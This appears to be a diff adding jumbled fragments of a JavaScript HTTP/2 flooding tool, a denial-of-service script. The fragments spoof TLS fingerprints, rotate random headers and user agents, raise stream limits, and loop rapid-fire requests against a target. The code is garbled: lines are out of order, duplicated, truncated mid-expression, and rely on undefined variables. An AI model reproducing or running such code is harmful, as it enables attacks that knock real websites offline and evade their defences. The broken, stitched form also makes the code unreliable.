@@ -1,0 +1,76 @@
+const request = client.request(headers)
+                    
+                    .on("response", response => {
+                        request.close();
+                        request.destroy();
+                        return
+                    })
+tlsSocket.on('secureConnect', async () => {
+    const ja3Fingerprint = await generateJA3Fingerprint(tlsSocket);
+    headers["ja3"] = ja3Fingerprint;
+})
+_tmp_22.push("Opera/9.62 (X11; Linux i686; U; pt-BR) Presto/2.1.1")
+client = http2.connect(parsedTarget.href, {
+        protocol: "https",
+        createConnection: () => tlsSocket,
+        "unknownProtocolTimeout": 10,
+        "maxReservedRemoteStreams": 4000,
+        "maxSessionMemory": 200,
+        settings : clasq,
+        socket: tlsSocket,
+    })
+headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform']
+headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform']
+clients.forEach(client => {
+    const intervalId = setInterval(() => {
+        async function sendRequests()  {
+            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
+            
+            
+            
+            
+            const limit = pLimit(10);
+
+const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
+
+
+
+
+
+                         
+            let dynHeaders = shuffleObject({
+                    ...taoDoiTuongNgauNhien(),
+                    ...taoDoiTuongNgauNhien(),
+                });
+                
+                const head = {
+                    ...dynHeaders,
+                    ...headers,
+                };
+
+            
+
+            
+            let count = 0;
+            let ratelimit = [];
+            const filterRateLimit = (ratelimit) => {
+            const currentTime = Date.now();
+            return ratelimit.filter(limit => currentTime - limit.ti...
+const requestPromise = limit(() => new Promise((resolve, reject) => {
+                                            const req = client.request(head, {
+                                                weight: priorityWeight,
+                                                parent:0,
+                                                exclusive: true,
+						                        endStream: true,
+                                                dependsOn: 0,
+                                               
+                                            });
+                                            req.setEncoding('utf8');
+                                            req.on('response', (res) => {
+                                            req.close(http2.constants.NO_ERROR);
+                                            req.destroy();
+                                            if (enabled('cookie')) {
+                                                const cookies = res.headers['set-cookie'...
+const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":")
+_tmp_49.push("SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)")
+_tmp_49.push("SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0")
